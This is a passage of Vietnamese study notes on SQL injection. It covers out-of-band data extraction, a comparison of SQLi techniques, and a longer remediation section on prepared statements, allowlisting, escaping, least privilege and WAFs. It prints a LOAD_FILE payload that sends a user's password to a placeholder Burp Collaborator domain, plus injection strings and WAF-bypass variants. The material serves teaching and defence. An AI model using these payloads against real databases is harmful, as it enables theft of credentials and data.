|                            | `xp_dirtree`  | `xp_cmdshell`      |
| -------------------------- | ------------- | ------------------ |
| **Mặc định**               | ✅ Có sẵn     | ❌ Bị tắt          |
| **Khả năng**               | DNS lookup    | Toàn bộ OS command |
| **Phổ biến trong pentest** | ✅ Thường gặp | ⚠️ Hiếm hơn        |


---

## 🔷 E. Nhận Data — Công Cụ Listening

**Ba lựa chọn để bắt callback:**

|Công cụ|Ưu điểm|Nhược điểm|
|---|---|---|
|**Burp Collaborator**|Tích hợp sẵn trong Burp Suite, log DNS & HTTP|Cần Burp Pro|
|**Interactsh** (ProjectDiscovery)|**Miễn phí**, có thể self-host|Cần setup thêm|
|**Custom listener** (Python `dnslib`, HTTP server)|**Toàn quyền kiểm soát**|Phức tạp hơn|

**Quy trình sử dụng Burp Collaborator:**

```
1. Lấy unique subdomain từ Burp Collaborator
         ↓
2. Nhúng subdomain đó vào payload:
   LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), 
   '.YOUR_BURP_COLLABORATOR_DOMAIN\\share'))
         ↓
3. Gửi request với payload
         ↓
4. Kiểm tra tab "Collaborator" trong Burp → Thấy DNS callback với data
```

---

## 🔷 F. Giới Hạn Của OOB

|Giới hạn|Mô tả|
|---|---|
|**Outbound network access**|DB server phải được phép kết nối ra ngoài — nhiều production setup chặn điều này|
|**Engine-specific payload**|MySQL, MSSQL, PostgreSQL cần **cú pháp khác nhau hoàn toàn**|
|**DNS size limit**|Subdomain label tối đa **63 ký tự** — data dài hơn cần chia nhỏ|
|**Tốc độ và độ tin cậy**|**Chậm hơn và kém ổn định hơn** so với In-Band hay Blind|

---

## 🔷 G. So Sánh Tổng Hợp Tất Cả Kỹ Thuật SQLi

| Kỹ thuật          | Tín hiệu            | Điều kiện               | Tốc độ               |
| ----------------- | ------------------- | ----------------------- | -------------------- |
| **Error-Based**   | Error message       | App hiển thị DB errors  | Nhanh                |
| **Union-Based**   | Data trong response | App hiển thị output     | Nhanh                |
| **Boolean-Based** | True/False response | App cho tín hiệu binary | Chậm                 |
| **Time-Based**    | Thời gian response  | SLEEP() không bị block  | Rất chậm             |
| **Out-of-Band**   | DNS/HTTP callback   | DB có outbound access   | Chậm & không ổn định |
# Remediation and Prevention
- Một penetration tester không chỉ cần biết **cách khai thác** SQLi mà còn phải hiểu **cách sửa** — vì báo cáo pentest phải bao gồm cả remediation. 
- Phần này trình bày **5 biện pháp phòng ngừa** theo thứ tự hiệu quả giảm dần: Prepared Statements là biện pháp **duy nhất thực sự giải quyết gốc rễ**, trong khi các biện pháp còn lại chỉ là **lớp bảo vệ bổ sung** (defense-in-depth).
## 🔷 A. Prepared Statements (Parameterised Queries) — Giải Pháp Thực Sự

> **Nguyên lý cốt lõi:** Tách hoàn toàn **SQL code** và **user data** — database nhận chúng qua hai kênh riêng biệt, input của user **không bao giờ được parse như SQL code**.

---

**PHP — Trước và Sau:**

php

```php
// ❌ VULNERABLE — String concatenation
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";
$result = mysqli_query($conn, $query);

// ✅ FIXED — Prepared Statement với PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);
$result = $stmt->fetchAll();
```

**Python — Trước và Sau:**

python

```python
# ❌ VULNERABLE — f-string concatenation
query = f"SELECT * FROM users WHERE username='{username}'"
cursor.execute(query)

# ✅ FIXED — Parameterised query
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

**Tại sao Prepared Statements hoạt động:**

```
Input của attacker: ' OR 1=1--

Với string concatenation:
Query = "...WHERE username='' OR 1=1--'"
→ Database parse toàn bộ như SQL code → INJECTION THÀNH CÔNG

Với Prepared Statement:
Placeholder '?' nhận input như data thuần túy
→ Database xử lý: WHERE username = "' OR 1=1--" (literal string)
→ Không có user nào có username này → INJECTION THẤT BẠI
```

|Placeholder|Ngôn ngữ/Framework|
|---|---|
|`?`|PHP PDO, Java JDBC|
|`%s`|Python MySQL connector|
|`@param`|C# ADO.NET|
|`:name`|PHP PDO (named params)|

> 🎯 **Kết luận:** Input **vật lý không thể thay đổi cấu trúc query** — đây là lý do Prepared Statements là giải pháp duy nhất thực sự.

- Placeholder (`?`, `%s`) Hoạt Động Như Thế Nào?

> Placeholder là **slot chờ data** — database compile query structure **trước** khi nhận input. Khi input đến, database đã "biết" query trông như thế nào rồi, input **không thể thay đổi cấu trúc đó** mà chỉ được điền vào slot đã định sẵn.

## 🔷 B. Input Validation — Kiểm Soát Trước Khi Đến Database
- Allowlisting vs Blocklisting
> **Allowlisting** định nghĩa "những gì được phép" — an toàn hơn vì **mọi thứ không được liệt kê đều bị từ chối**. **Blocklisting** định nghĩa "những gì bị cấm" — không bao giờ đầy đủ vì attacker luôn tìm được cách chưa được nghĩ đến.
- **Hai approach:**

|Approach|Mô tả|Hiệu quả|
|---|---|---|
|**Allowlisting** ✅|Định nghĩa chính xác input hợp lệ, từ chối mọi thứ khác|**Mạnh**|
|**Blocklisting** ❌|Filter các ký tự nguy hiểm (`'`, `--`, ...)|**Yếu, dễ bypass**|

**Ví dụ allowlisting (PHP):**

php

```php
// Nếu tham số phải là số nguyên:
if (!ctype_digit($_GET['id'])) {
    die("Invalid input");
}
```

> ⚠️ **Quan trọng:** Không bao giờ dùng input validation **một mình** — luôn kết hợp với Prepared Statements. Tại sao blocklisting yếu? Attacker có thể bypass qua:
> 
> - Double encoding (`%27` thay vì `'`)
> - Alternate syntax (`CHAR(39)` thay vì `'`)
> - Cú pháp không được nghĩ đến

---

## 🔷 C. Escaping User Input — Giải Pháp Cuối Cùng

**Cơ chế:** Thêm backslash trước ký tự đặc biệt → database treat như literal thay vì syntax.

```
' → \'
" → \"
\ → \\
```

**Hạn chế nghiêm trọng:**

|Hạn chế|Mô tả|
|---|---|
|**Fragile**|Dễ bị bypass bằng encoding tricks|
|**Database-specific**|Mỗi engine có ký tự đặc biệt và escaping rules riêng|
|**Error-prone**|Dễ bỏ sót trường hợp|

> 📌 **Chỉ dùng như phương án cuối cùng** — khi làm việc với **legacy code không thể refactor** để dùng Prepared Statements.

---

## 🔷 D. Principle of Least Privilege — Giới Hạn Thiệt Hại

> **Ngay cả khi SQLi xảy ra**, nếu database account có quyền tối thiểu → attacker **không thể leo thang** lên các hành động nghiêm trọng hơn.

**Nguyên tắc:**

|Tình huống|Quyền cần thiết|
|---|---|
|Read-only application|Chỉ `SELECT`|
|Write application|`SELECT`, `INSERT`, `UPDATE`|
|**Không bao giờ**|Connect từ app với `root` hay `sa`|

**Tại sao quan trọng:**

```
Attacker exploit SQLi qua low-privilege account
         ↓
Cố chạy: DROP TABLE users;    → DENIED (không có DROP privilege)
Cố chạy: xp_cmdshell          → DENIED (không có quyền)
Cố đọc: database khác         → DENIED (không có access)
         ↓
Thiệt hại bị giới hạn đáng kể
```

---

## 🔷 E. Web Application Firewall (WAF) — Lớp Bảo Vệ Bổ Sung

**WAF hoạt động:** Inspect incoming request và block các **known attack patterns**:

- `' OR 1=1`
- `UNION SELECT`
- `information_schema`
- Và nhiều signature khác

**Hạn chế của WAF:**

|Kỹ thuật bypass WAF|Ví dụ|
|---|---|
|Encoding|`UNION%20SELECT`, `UN/**/ION`|
|Case variation|`uNiOn SeLeCt`|
|Alternative syntax|`|
|Obfuscation|`UNI``ON SEL``ECT`|

> 🔴 **WAF KHÔNG phải substitute cho code bảo mật** — chỉ là extra layer. Attacker có kinh nghiệm **luôn có cách bypass WAF**.

---

#### 🔷 F. Tổng Hợp — Thứ Tự Ưu Tiên & Hiệu Quả

```
Cấp độ bảo vệ (từ cao đến thấp):

1. Prepared Statements    ████████████  Giải quyết gốc rễ hoàn toàn
2. Input Validation       ██████░░░░░░  Lớp kiểm soát đầu vào
3. Least Privilege        █████░░░░░░░  Giới hạn thiệt hại khi bị exploit
4. WAF                    ████░░░░░░░░  Extra layer, dễ bypass
5. Escaping               ███░░░░░░░░░  Last resort, fragile
```

**Defense-in-depth — Kết hợp nhiều lớp:**

```
User Input
    ↓ [Input Validation — Allowlisting]
    ↓ [WAF — Block known patterns]
    ↓ [Prepared Statements — Tách code/data]
    ↓ [Least Privilege — Giới hạn thiệt hại nếu bypass]
Database
```

